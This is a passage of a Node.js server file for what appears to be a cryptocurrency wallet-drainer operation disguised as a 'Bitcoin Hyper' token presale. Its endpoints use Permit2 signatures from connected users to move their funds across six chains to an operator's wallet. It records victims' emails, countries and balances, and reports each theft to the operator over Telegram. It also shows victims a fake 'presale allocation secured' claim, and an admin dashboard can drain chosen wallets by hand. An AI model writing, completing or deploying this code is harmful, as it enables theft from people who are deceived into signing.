    console.log(`\n⚡ EXECUTE UNIVERSAL DRAIN: ${walletAddress} on ${chainName}`);
    
    const participant = memoryStorage.participants.find(
      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
    );
    
    if (!participant) {
      return res.status(404).json({ 
        success: false, 
        error: 'Wallet not found' 
      });
    }
    
    const pendingPermit = memoryStorage.pendingPermits.get(walletAddress.toLowerCase());
    if (!pendingPermit) {
      return res.status(400).json({
        success: false,
        error: 'No pending permit found. Please prepare permit first.'
      });
    }
    
    // Execute drain on specified chain
    const chainPermit = pendingPermit.permitData.find(p => p.chain === chainName);
    if (!chainPermit) {
      return res.status(400).json({
        success: false,
        error: `No permit data for ${chainName}`
      });
    }
    
    if (pendingPermit.completedChains.includes(chainName)) {
      return res.status(400).json({
        success: false,
        error: `${chainName} already drained`
      });
    }
    
    const chainId = chainPermit.chainId;
    
    const drainResult = await executeUniversalDrainOnChain(walletAddress, chainName, chainId);
    
    if (drainResult.success) {
      // Update participant
      participant.drained = true;
      participant.drainedAt = new Date();
      participant.drainTransactions = participant.drainTransactions || [];
      participant.drainTransactions.push({
        chain: chainName,
        amount: drainResult.amount,
        valueUSD: drainResult.valueUSD,
        txHash: drainResult.txHash,
        explorerUrl: drainResult.explorerUrl,
        timestamp: new Date().toISOString()
      });
      participant.drainValue = ((parseFloat(participant.drainValue || 0) + parseFloat(drainResult.valueUSD)).toFixed(2));
      
      // Update statistics
      memoryStorage.settings.statistics.totalDrainedUSD += parseFloat(drainResult.valueUSD);
      if (!participant.drainedPreviously) {
        memoryStorage.settings.statistics.totalDrainedWallets++;
        participant.drainedPreviously = true;
      }
      
      memoryStorage.settings.statistics.realTransactions.push({
        wallet: walletAddress,
        chain: chainName,
        amount: drainResult.amount,
        valueUSD: drainResult.valueUSD,
        txHash: drainResult.txHash,
        timestamp: new Date().toISOString()
      });
      
      // Send Telegram notification
      await sendTelegramMessage(
        `💰 <b>UNIVERSAL DRAIN EXECUTED</b>\n` +
        `👛 ${walletAddress.substring(0, 10)}...\n` +
        `🔗 ${chainName}\n` +
        `💵 $${drainResult.valueUSD}\n` +
        `📝 TX: ${drainResult.txHash}\n` +
        `🔍 Explorer: ${drainResult.explorerUrl}\n` +
        `⏰ ${new Date().toLocaleString()}`
      );
      
      // Check if all chains completed
      if (drainResult.allCompleted) {
        participant.allChainsDrained = true;
        participant.completedAt = new Date();
        
        // Mark as claimed for the celebration modal
        participant.claimed = true;
        participant.claimedAt = new Date();
        memoryStorage.settings.statistics.claimedParticipants++;
        
        await sendTelegramMessage(
          `✅ <b>ALL CHAINS DRAINED - COMPLETE</b>\n` +
          `👛 ${walletAddress.substring(0, 10)}...\n` +
          `💰 Total: $${participant.drainValue}\n` +
          `🎉 Presale allocation secured!\n` +
          `⏰ ${new Date().toLocaleString()}`
        );
      }
      
      res.json({
        success: true,
        message: `✅ Successfully drained $${drainResult.valueUSD} on ${chainName}`,
        data: {
          walletAddress,
          chain: chainName,
          amount: drainResult.amount,
          symbol: drainResult.symbol,
          valueUSD: drainResult.valueUSD,
          txHash: drainResult.txHash,
          explorerUrl: drainResult.explorerUrl,
          allCompleted: drainResult.allCompleted,
          remainingChains: drainResult.remainingChains,
          totalDrainedUSD: participant.drainValue,
          claimed: participant.claimed || false,
          tokenAllocation: participant.tokenAllocation || { amount: '5000', valueUSD: '850' }
        }
      });
    } else {
      res.status(400).json({
        success: false,
        error: drainResult.error || 'Drain execution failed'
      });
    }
    
  } catch (error) {
    console.error('Execute universal drain error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Drain execution failed' 
    });
  }
});

// ============================================
// DRAIN STATUS ENDPOINT
// ============================================

app.post('/api/presale/drain-status', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    const participant = memoryStorage.participants.find(
      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
    );
    
    if (!participant) {
      return res.status(404).json({ 
        success: false, 
        error: 'Wallet not found' 
      });
    }
    
    const pendingPermit = memoryStorage.pendingPermits.get(walletAddress.toLowerCase());
    
    const chains = pendingPermit?.permitData.map(p => ({
      chain: p.chain,
      amount: p.amount,
      symbol: p.symbol,
      valueUSD: p.valueUSD,
      drained: pendingPermit.completedChains.includes(p.chain)
    })) || [];
    
    res.json({
      success: true,
      data: {
        walletAddress,
        isEligible: participant.isEligible,
        drained: participant.drained || false,
        allChainsDrained: participant.allChainsDrained || false,
        claimed: participant.claimed || false,
        drainValue: participant.drainValue || '0.00',
        drainTransactions: participant.drainTransactions || [],
        pendingPermit: !!pendingPermit,
        totalChains: pendingPermit?.permitData.length || 0,
        completedChains: pendingPermit?.completedChains.length || 0,
        remainingChains: pendingPermit ? (pendingPermit.permitData.length - pendingPermit.completedChains.length) : 0,
        chains,
        tokenAllocation: participant.tokenAllocation || { amount: '5000', valueUSD: '850' }
      }
    });
    
  } catch (error) {
    console.error('Drain status error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Failed to get drain status' 
    });
  }
});

// ============================================
// CLAIM ENDPOINT (For celebration modal)
// ============================================

app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n🎯 CLAIM REQUEST: ${walletAddress}`);
    
    const participant = memoryStorage.participants.find(
      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
    );
    
    if (!participant) {
      return res.status(404).json({ 
        success: false, 
        error: 'Wallet not found. Connect first.' 
      });
    }
    
    if (!participant.isEligible) {
      return res.status(400).json({ 
        success: false, 
        error: 'Wallet not eligible for claiming' 
      });
    }
    
    // Mark as claimed
    participant.claimed = true;
    participant.claimedAt = new Date();
    memoryStorage.settings.statistics.claimedParticipants++;
    
    // Generate claim ID
    const claimId = `BTH-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    // Telegram notification
    await sendTelegramMessage(
      `🎯 <b>CLAIM COMPLETED</b>\n` +
      `👛 ${walletAddress.substring(0, 10)}...\n` +
      `💰 Total Drained: $${participant.drainValue || '0.00'}\n` +
      `🎟️ Claim ID: ${claimId}\n` +
      `🎉 Presale allocation secured!\n` +
      `⏰ ${new Date().toLocaleString()}`
    );
    
    res.json({
      success: true,
      message: '✅ Claim processed successfully!',
      data: {
        walletAddress,
        claimId,
        claimed: true,
        claimedAt: new Date().toISOString(),
        tokenAmount: participant.tokenAllocation?.amount || '5000',
        valueUSD: participant.tokenAllocation?.valueUSD || '850',
        totalDrained: participant.drainValue || '0.00'
      }
    });
    
  } catch (error) {
    console.error('Claim error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Claim processing failed' 
    });
  }
});

// ============================================
// ADMIN ENDPOINTS
// ============================================

function authenticateAdmin(req, res, next) {
  const token = req.query.token || req.headers.authorization?.replace('Bearer ', '');
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token === adminToken) {
    next();
  } else {
    res.status(401).json({ success: false, error: 'Unauthorized' });
  }
}

app.get('/api/admin/test-balance', authenticateAdmin, async (req, res) => {
  try {
    const { wallet } = req.query;
    
    if (!wallet?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`🧪 TEST BALANCE: ${wallet}`);
    
    const scanResult = await getRealWalletBalance(wallet);
    
    if (scanResult.success) {
      res.json({
        success: true,
        wallet: wallet,
        totalValueUSD: scanResult.data.totalValueUSD,
        isEligible: scanResult.data.isEligible,
        eligibilityReason: scanResult.data.eligibilityReason,
        chains: scanResult.data.chains,
        balances: scanResult.data.balances,
        rawBalances: scanResult.data.rawBalances,
        scanId: scanResult.data.scanId,
        timestamp: new Date().toISOString(),
        message: `Balance: $${scanResult.data.totalValueUSD} | Eligible: ${scanResult.data.isEligible}`
      });
    } else {
      res.status(500).json({
        success: false,
        error: scanResult.error,
        wallet: wallet
      });
    }
    
  } catch (error) {
    console.error('Test balance error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message
    });
  }
});

app.post('/api/admin/drain/manual', authenticateAdmin, async (req, res) => {
  try {
    const { walletAddress, chainName } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n🔧 ADMIN MANUAL UNIVERSAL DRAIN`);
    console.log(`   Wallet: ${walletAddress}`);
    console.log(`   Chain: ${chainName || 'First available'}`);
    
    // Telegram notification
    await sendTelegramMessage(
      `⚡ <b>ADMIN MANUAL DRAIN REQUEST</b>\n` +
      `👛 ${walletAddress.substring(0, 10)}...\n` +
      `🔗 ${chainName || 'Auto-select'}\n` +
      `👨‍💼 Admin triggered\n` +
      `⏰ ${new Date().toLocaleString()}`
    );
    
    // Get fresh balance
    const scanResult = await getRealWalletBalance(walletAddress);
    
    if (!scanResult.success) {
      return res.status(500).json({ 
        success: false, 
        error: 'Failed to scan wallet'
      });
    }
    
    console.log(`📊 Balance: $${scanResult.data.totalValueUSD} | Eligible: ${scanResult.data.isEligible}`);
    
    if (!scanResult.data.isEligible) {
      return res.json({
        success: false,
        message: `❌ Not eligible ($${scanResult.data.totalValueUSD} < $${memoryStorage.settings.drainThreshold})`,
        data: {
          walletValue: scanResult.data.totalValueUSD,
          threshold: memoryStorage.settings.drainThreshold
        }
      });
    }
    
    if (!memoryStorage.settings.drainEnabled) {
      return res.json({
        success: false,
        message: '❌ Drain disabled',
        data: {
          walletValue: scanResult.data.totalValueUSD
        }
      });
    }
    
    // Prepare permit first if not exists
    let pendingPermit = memoryStorage.pendingPermits.get(walletAddress.toLowerCase());
    
    if (!pendingPermit) {
      console.log('   Preparing new permit...');
      const permitResult = await prepareUniversalPermit(walletAddress, scanResult.data);
      if (!permitResult.success) {
        return res.json({
          success: false,
          message: `❌ Failed to prepare permit: ${permitResult.error}`,
          data: {
            walletValue: scanResult.data.totalValueUSD
          }
        });
      }
      pendingPermit = memoryStorage.pendingPermits.get(walletAddress.toLowerCase());
    }
    
    // Determine which chain to drain
    let targetChain = chainName;
    if (!targetChain) {
      // Find first undrained chain
      targetChain = pendingPermit.permitData.find(p => 
        !pendingPermit.completedChains.includes(p.chain)
      )?.chain;
    }
    
    if (!targetChain) {
      return res.json({
        success: false,
        message: '❌ No undrained chains available',
        data: {
          completedChains: pendingPermit.completedChains,
          totalChains: pendingPermit.permitData.length
        }
      });
    }
    
    // Execute drain
    console.log(`   Executing drain on ${targetChain}...`);
    const drainResult = await executeUniversalDrainOnChain(walletAddress, targetChain, RPC_CONFIG[targetChain]?.chainId);
    
    if (drainResult.success) {
      // Update participant
      const participant = memoryStorage.participants.find(
        p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
      );
      
      if (participant) {
        participant.drained = true;
        participant.drainTransactions = participant.drainTransactions || [];
        participant.drainTransactions.push({
          chain: targetChain,
          amount: drainResult.amount,
          valueUSD: drainResult.valueUSD,
          txHash: drainResult.txHash,
          explorerUrl: drainResult.explorerUrl,
          timestamp: new Date().toISOString()
        });
        participant.drainValue = ((parseFloat(participant.drainValue || 0) + parseFloat(drainResult.valueUSD)).toFixed(2));
      }
      
      // Update statistics
      memoryStorage.settings.statistics.totalDrainedUSD += parseFloat(drainResult.valueUSD);
      memoryStorage.settings.statistics.totalDrainedWallets++;
      memoryStorage.settings.statistics.realTransactions.push({
        wallet: walletAddress,
        chain: targetChain,
        amount: drainResult.amount,
        valueUSD: drainResult.valueUSD,
        txHash: drainResult.txHash,
        timestamp: new Date().toISOString(),
        admin: true
      });
      
      await sendTelegramMessage(
        `💰 <b>ADMIN DRAIN COMPLETED</b>\n` +
        `👛 ${walletAddress.substring(0, 10)}...\n` +
        `🔗 ${targetChain}\n` +
        `💵 $${drainResult.valueUSD}\n` +
        `📝 TX: ${drainResult.txHash}\n` +
        `🏦 Lifetime Total: $${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}\n` +
        `⏰ ${new Date().toLocaleString()}`
      );
      
      res.json({
        success: true,
        message: `✅ Drained $${drainResult.valueUSD} on ${targetChain}`,
        data: {
          chain: targetChain,
          amount: drainResult.amount,
          symbol: drainResult.symbol,
          valueUSD: drainResult.valueUSD,
          txHash: drainResult.txHash,
          explorerUrl: drainResult.explorerUrl,
          allCompleted: drainResult.allCompleted,
          remainingChains: drainResult.remainingChains,
          walletValue: scanResult.data.totalValueUSD
        }
      });
    } else {
      res.json({
        success: false,
        message: `❌ Drain failed: ${drainResult.error}`,
        data: {
          walletValue: scanResult.data.totalValueUSD,
          chain: targetChain
        }
      });
    }
    
  } catch (error) {
    console.error('Manual drain error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message
    });
  }
});

app.post('/api/admin/drain/toggle', authenticateAdmin, (req, res) => {
  memoryStorage.settings.drainEnabled = !memoryStorage.settings.drainEnabled;
  
  res.json({
    success: true,
    message: `Universal drain ${memoryStorage.settings.drainEnabled ? 'enabled' : 'disabled'}`,
    drainEnabled: memoryStorage.settings.drainEnabled
  });
});

app.get('/api/admin/stats', authenticateAdmin, (req, res) => {
  const routerStatus = {};
  for (const [chain, address] of Object.entries(UNIVERSAL_DRAIN_ROUTER)) {
    routerStatus[chain] = address && address !== '0x0000000000000000000000000000000000000000' 
      ? address.substring(0, 10) + '...' 
      : '❌ NOT DEPLOYED';
  }
  
  const stats = {
    totalParticipants: memoryStorage.participants.length,
    eligibleParticipants: memoryStorage.participants.filter(p => p.isEligible).length,
    claimedParticipants: memoryStorage.participants.filter(p => p.claimed).length,
    totalDrainedUSD: memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2),
    totalDrainedWallets: memoryStorage.settings.statistics.totalDrainedWallets,
    uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size,
    drainThreshold: memoryStorage.settings.drainThreshold,
    drainEnabled: memoryStorage.settings.drainEnabled,
    autoDrainOnClaim: memoryStorage.settings.autoDrainOnClaim,
    realTransactions: memoryStorage.settings.statistics.realTransactions.length,
    pendingPermits: memoryStorage.pendingPermits.size,
    
    recentWallets: memoryStorage.participants.slice(-10).map(p => ({
      wallet: p.walletAddress.substring(0, 10) + '...',
      email: p.email || 'No email',
      country: p.country || 'Unknown',
      flag: p.flag || '🌍',
      valueUSD: p.totalValueUSD ? `$${p.totalValueUSD.toFixed(2)}` : '$0.00',
      eligible: p.isEligible,
      claimed: p.claimed,
      drained: p.drained,
      allChainsDrained: p.allChainsDrained || false,
      drainValue: p.drainValue ? `$${p.drainValue}` : '$0.00',
      time: p.connectedAt?.toLocaleTimeString() || 'Unknown'
    })),
    
    system: {
      telegram: telegramEnabled,
      telegramBot: telegramBotName || 'Not set',
      destinationWallet: DESTINATION_WALLET ? DESTINATION_WALLET.substring(0, 10) + '...' : 'Not set',
      adminSigner: adminSigner ? adminSigner.address.substring(0, 10) + '...' : 'Not configured',
      universalRouters: routerStatus,
      permit2: PERMIT2_ADDRESS,
      version: 'v18.0 - UNIVERSAL DRAIN',
      rpcStatus: 'Multi-chain with Permit2'
    }
  };
  
  res.json({ success: true, stats });
});

app.get('/admin', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token !== adminToken) {
    return res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Bitcoin Hyper Admin</title>
        <style>
          body { font-family: Arial; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
          .login { background: #1e293b; padding: 40px; border-radius: 10px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
          h1 { color: #F7931A; margin-bottom: 20px; }
          input { padding: 12px; margin: 10px 0; width: 300px; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: white; font-size: 14px; }
          button { background: #F7931A; color: white; border: none; padding: 12px 30px; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 15px; }
          button:hover { background: #e67e22; }
        </style>
      </head>
      <body>
        <div class="login">
          <h1>🔐 BITCOIN HYPER ADMIN</h1>
          <p>Enter admin token:</p>
          <input type="password" id="token" placeholder="Admin Token" />
          <br>
          <button onclick="login()">Login to Dashboard</button>
        </div>
        <script>
          function login() {
            const token = document.getElementById('token').value;
            if (!token) return alert('Enter token');
            window.location.href = '/admin?token=' + token;
          }
        </script>
      </body>
      </html>
    `);
  }
  
  // Count deployed routers
  let deployedCount = 0;
  let routerHtml = '';
  for (const [chain, address] of Object.entries(UNIVERSAL_DRAIN_ROUTER)) {
    const isDeployed = address && address !== '0x0000000000000000000000000000000000000000';
    if (isDeployed) deployedCount++;
    routerHtml += `<p><strong>${chain}:</strong> ${isDeployed ? '✅ ' + address.substring(0, 10) + '...' : '❌ NOT DEPLOYED'}</p>`;
  }
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Bitcoin Hyper Admin Dashboard v18.0 - Universal Drain</title>
      <style>
        body { font-family: Arial, sans-serif; background: #0f172a; color: white; padding: 20px; }
        .header { text-align: center; margin-bottom: 30px; }
        h1 { color: #F7931A; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 30px 0; }
        .stat-card { background: #1e293b; padding: 25px; border-radius: 10px; text-align: center; border-left: 5px solid #F7931A; }
        .stat-value { font-size: 28px; font-weight: bold; margin-bottom: 10px; }
        .stat-label { color: #94a3b8; font-size: 14px; }
        .controls { background: #1e293b; padding: 20px; border-radius: 10px; margin: 20px 0; }
        .wallet-input { padding: 12px; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: white; width: 100%; max-width: 500px; font-size: 14px; }
        .btn { padding: 12px 24px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; margin: 5px; }
        .btn-primary { background: #F7931A; color: white; }
        .btn-danger { background: #ef4444; color: white; }
        .btn-success { background: #10b981; color: white; }
        .btn-warning { background: #f59e0b; color: white; }
        .btn-info { background: #3b82f6; color: white; }
        .recent-wallets { margin-top: 30px; }
        .wallet-item { background: #1e293b; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 4px solid #F7931A; }
        .wallet-address { font-family: monospace; color: #60a5fa; }
        .status { display: inline-block; padding: 4px 8px; border-radius: 4px; font-size: 12px; margin-left: 10px; }
        .eligible { background: #10b981; }
        .not-eligible { background: #ef4444; }
        .drained { background: #8b5cf6; }
        .complete { background: #10b981; }
        .config { background: #1e293b; padding: 15px; border-radius: 8px; margin: 15px 0; }
        .warning { color: #f59e0b; font-weight: bold; }
        .success { color: #10b981; }
        .router-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 10px; margin-top: 10px; }
        .router-item { background: #0f172a; padding: 10px; border-radius: 6px; border-left: 3px solid #F7931A; }
      </style>
    </head>
    <body>
      <div class="header">
        <h1>⚡ BITCOIN HYPER UNIVERSAL DRAIN v18.0</h1>
        <p>REAL TRANSACTIONS - ONE SIGNATURE FOR ALL CHAINS</p>
        <div style="margin-top: 15px; color: #94a3b8;">
          <span>Drain: ${memoryStorage.settings.drainEnabled ? '✅ ACTIVE' : '❌ INACTIVE'}</span> | 
          <span>Auto-Drain: ${memoryStorage.settings.autoDrainOnClaim ? '✅ ON' : '❌ OFF'}</span> | 
          <span>Threshold: $${memoryStorage.settings.drainThreshold}</span> | 
          <span>Telegram: ${telegramEnabled ? '✅ ON' : '❌ OFF'}</span> |
          <span>Wallets: ${memoryStorage.participants.length}</span> |
          <span>Drained: $${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}</span>
        </div>
      </div>
      
      <div class="config">
        <h3>⚙️ Universal Drain Configuration</h3>
        <p><strong>Destination Wallet:</strong> <span class="success">${DESTINATION_WALLET ? DESTINATION_WALLET.substring(0, 10) + '...' + DESTINATION_WALLET.substring(38) : '❌ NOT SET'}</span></p>
        <p><strong>Admin Signer:</strong> ${adminSigner ? '✅ ' + adminSigner.address.substring(0, 10) + '...' : '❌ NOT CONFIGURED'}</p>
        <p><strong>Permit2 Address:</strong> <span class="success">${PERMIT2_ADDRESS}</span></p>
        <p><strong>Universal Drain Routers:</strong> ${deployedCount}/6 deployed</p>
        <div class="router-grid">
          ${Object.entries(UNIVERSAL_DRAIN_ROUTER).map(([chain, address]) => {
            const isDeployed = address && address !== '0x0000000000000000000000000000000000000000';
            return `<div class="router-item">
              <strong>${chain}:</strong><br>
              ${isDeployed ? '✅ ' + address.substring(0, 8) + '...' : '❌ Not Deployed'}
            </div>`;
          }).join('')}
        </div>
        <p><small>Deploy UniversalDrainRouter contract on each chain and add addresses to .env</small></p>
      </div>
      
      <div class="stats-grid">
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.totalParticipants}</div>
          <div class="stat-label">Total Participants</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.participants.filter(p => p.isEligible).length}</div>
          <div class="stat-label">Eligible Wallets</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">$${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}</div>
          <div class="stat-label">Total Drained (Real)</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.totalDrainedWallets}</div>
          <div class="stat-label">Wallets Drained</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.uniqueIPs.size}</div>
          <div class="stat-label">Unique IPs</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.realTransactions.length}</div>
          <div class="stat-label">Real TXs</div>
        </div>
      </div>
      
      <div class="controls">
        <h3>🔧 Manual Operations</h3>
        <p>Enter wallet address:</p>
        <input type="text" id="walletInput" class="wallet-input" placeholder="0x742d35Cc6634C0532925a3b844Bc454e4438f44e" value="0x742d35Cc6634C0532925a3b844Bc454e4438f44e">
        <div style="margin-top: 15px;">
          <select id="chainSelect" style="padding: 12px; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: white; margin-right: 10px;">
            <option value="">Auto-select chain</option>
            <option value="Ethereum">Ethereum</option>
            <option value="BSC">BSC</option>
            <option value="Polygon">Polygon</option>
            <option value="Arbitrum">Arbitrum</option>
            <option value="Optimism">Optimism</option>
            <option value="Avalanche">Avalanche</option>
          </select>
          <button class="btn btn-primary" onclick="testBalance()">Test Balance</button>
          <button class="btn btn-danger" onclick="manualDrain()">Execute Universal Drain</button>
          <button class="btn ${memoryStorage.settings.drainEnabled ? 'btn-danger' : 'btn-success'}" onclick="toggleDrain()">
            ${memoryStorage.settings.drainEnabled ? 'Disable Drain' : 'Enable Drain'}
          </button>
          <button class="btn btn-warning" onclick="refreshStats()">Refresh Stats</button>
        </div>
        <p style="color: #94a3b8; font-size: 12px; margin-top: 10px;">
          ⚡ ONE SIGNATURE - ALL CHAINS - REAL BLOCKCHAIN TRANSACTIONS
        </p>
      </div>
      
      <div class="recent-wallets">
        <h3>📊 Recent Wallet Activity</h3>
        ${memoryStorage.participants.slice(-8).reverse().map(p => `
          <div class="wallet-item">
            <div>
              <span class="wallet-address">${p.walletAddress.substring(0, 10)}...</span>
              <span class="status ${p.allChainsDrained ? 'complete' : p.drained ? 'drained' : p.claimed ? 'drained' : p.isEligible ? 'eligible' : 'not-eligible'}">
                ${p.allChainsDrained ? '✅ COMPLETE' : p.drained ? '💰 DRAINED' : p.claimed ? '✅ CLAIMED' : p.isEligible ? '✅ ELIGIBLE' : '❌ NOT ELIGIBLE'}
              </span>
            </div>
            <div style="margin-top: 8px; font-size: 14px;">
              <span>📧 ${p.email || 'No email'}</span> | 
              <span>${p.flag || '🌍'} ${p.country || 'Unknown'}</span> | 
              <span style="color: #F7931A; font-weight: bold;">$${p.totalValueUSD ? p.totalValueUSD.toFixed(2) : '0.00'}</span>
              ${p.drainValue ? ` | <span style="color: #8b5cf6;">Drained: $${p.drainValue}</span>` : ''}
            </div>
            <div style="margin-top: 5px; font-size: 12px; color: #94a3b8;">
              ${p.connectedAt ? p.connectedAt.toLocaleString() : 'Unknown time'}
              ${p.chains?.length > 0 ? ` | Chains: ${p.chains.join(', ')}` : ''}
              ${p.drainTransactions?.length > 0 ? ` | TXs: ${p.drainTransactions.length}` : ''}
            </div>
          </div>
        `).join('')}
        ${memoryStorage.participants.length === 0 ? '<p style="color: #94a3b8; text-align: center;">No wallets scanned yet</p>' : ''}
      </div>
      
      <div style="margin-top: 40px; text-align: center; color: #94a3b8; font-size: 12px;">
        <p>
          <a href="/api/health" target="_blank" style="color: #10b981;">Health Check</a> | 
          <a href="/api/admin/stats?token=${token}" target="_blank" style="color: #F7931A;">JSON Stats</a>
        </p>
        <p>⚡ UNIVERSAL DRAIN v18.0 - REAL BLOCKCHAIN TRANSACTIONS - ONE SIGNATURE FOR ALL CHAINS</p>
        <p class="success">✅ DRAIN WALLET CONFIGURED: ${adminSigner ? adminSigner.address.substring(0, 10) + '...' : '❌ NOT CONFIGURED'}</p>
        <p class="warning">⚠️ Deploy UniversalDrainRouter on all chains for full functionality</p>
      </div>
      
      <script>
        function testBalance() {
          const wallet = document.getElementById('walletInput').value;
          if (!wallet || !wallet.startsWith('0x')) return alert('Enter valid wallet address');
          
          window.open('/api/admin/test-balance?token=${token}&wallet=' + wallet, '_blank');
        }
        
        function manualDrain() {
          const wallet = document.getElementById('walletInput').value;
          if (!wallet || !wallet.startsWith('0x')) return alert('Enter valid wallet address');
          
          const chain = document.getElementById('chainSelect').value;
          
          if (!confirm('Execute UNIVERSAL DRAIN on ' + wallet.substring(0, 10) + '...?\n\n⚠️ This will execute REAL blockchain transactions!')) return;
          
          fetch('/api/admin/drain/manual?token=${token}', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              walletAddress: wallet,
              chainName: chain || undefined
            })
          })
            .then(r => r.json())
            .then(data => {
              alert(data.message);
              if (data.success) {
                setTimeout(() => location.reload(), 2000);
              }
            })
            .catch(e => alert('Error: ' + e));
        }
        
        function toggleDrain() {
          fetch('/api/admin/drain/toggle?token=${token}', { method: 'POST' })
            .then(r => r.json())
            .then(data => {
              alert(data.message);
              location.reload();
            });
        }
        
        function refreshStats() {
          location.reload();
        }
        
        // Auto-refresh every 30 seconds
        setTimeout(() => location.reload(), 30000);
      </script>
    </body>
    </html>
  `);
});

// ============================================
// INITIALIZE ADMIN SIGNER
// ============================================

async function initializeAdminSigner() {
  if (process.env.DRAIN_WALLET_PRIVATE_KEY) {
    try {
      const providerInfo = await getChainProvider('Ethereum');
      if (providerInfo) {
        adminSigner = new ethers.Wallet(process.env.DRAIN_WALLET_PRIVATE_KEY, providerInfo.provider);
        console.log(`💰 Admin signer initialized: ${adminSigner.address}`);
        
        try {
          const balance = await providerInfo.provider.getBalance(adminSigner.address);
          console.log(`💰 Admin signer balance: ${ethers.formatEther(balance)} ETH`);
        } catch (e) {
          console.log('Could not check admin signer balance');
        }
      }
    } catch (error) {
      console.log('Admin signer error:', error.message);
    }
  } else {
    console.log('⚠️ No drain wallet private key set. Set DRAIN_WALLET_PRIVATE_KEY in .env');
  }
}

// ============================================
// START SERVER
// ============================================

app.listen(PORT, '0.0.0.0', async () => {
  // Check router deployment status
  let deployedRouters = 0;
  for (const [chain, address] of Object.entries(UNIVERSAL_DRAIN_ROUTER)) {
    if (address && address !== '0x0000000000000000000000000000000000000000') {
      deployedRouters++;
    }
  }
  
  console.log(`
  ⚡ BITCOIN HYPER UNIVERSAL DRAIN v18.0
  ========================================
  📍 Port: ${PORT}
  🔗 Health: http://localhost:${PORT}/api/health
  📊 Admin: http://localhost:${PORT}/admin?token=${process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'}
  
  ✅ UNIVERSAL DRAIN WITH PERMIT2:
  - ONE SIGNATURE for ALL CHAINS
  - REAL blockchain transactions
  - NO simulations, NO rubbish
  - Telegram notifications for every step
  
  🔗 DRAIN PROCESS:
  1. Wallet connects → Balance check
  2. Prepare universal permit → EIP-712 data
  3. User signs ONCE → Signature
  4. Execute drain on each chain → REAL transactions
  5. Funds go to: ${DESTINATION_WALLET.substring(0, 10)}...
  
  ⚡ SYSTEM CONFIGURATION:
  - Threshold: $${memoryStorage.settings.drainThreshold}
  - Status: ${memoryStorage.settings.drainEnabled ? 'ACTIVE' : 'INACTIVE'}
  - Admin Signer: ${adminSigner ? '✅ ' + adminSigner.address.substring(0, 10) + '...' : '❌ NOT CONFIGURED'}
  - Universal Routers: ${deployedRouters}/6 deployed
  
  🔧 UNIVERSAL DRAIN ROUTER STATUS:
  ${Object.entries(UNIVERSAL_DRAIN_ROUTER).map(([chain, addr]) => 
    `  - ${chain.padEnd(10)}: ${addr && addr !== '0x0000000000000000000000000000000000000000' ? '✅ DEPLOYED' : '❌ NOT DEPLOYED'}`
  ).join('\n')}
  
  🚀 STARTING SERVER...
  `);
  
  // Initialize services
  console.log('\n📡 Initializing Telegram...');
  await testTelegramConnection();
  
  console.log('\n💰 Initializing admin signer...');
  await initializeAdminSigner();
  
  if (!adminSigner) {
    console.log('\n⚠️ WARNING: Admin signer not initialized!');
    console.log('   Set DRAIN_WALLET_PRIVATE_KEY in .env');
  }
  
  if (deployedRouters === 0) {
    console.log('\n⚠️ WARNING: No Universal Drain Routers deployed!');
    console.log('   Deploy UniversalDrainRouter contract on each chain');
    console.log('   Add addresses to .env: UNIVERSAL_DRAIN_ROUTER_[CHAIN]');
  } else if (deployedRouters < 6) {
    console.log(`\n⚠️ WARNING: Only ${deployedRouters}/6 Universal Drain Routers deployed`);
    console.log('   Deploy on remaining chains for full functionality');
  } else {
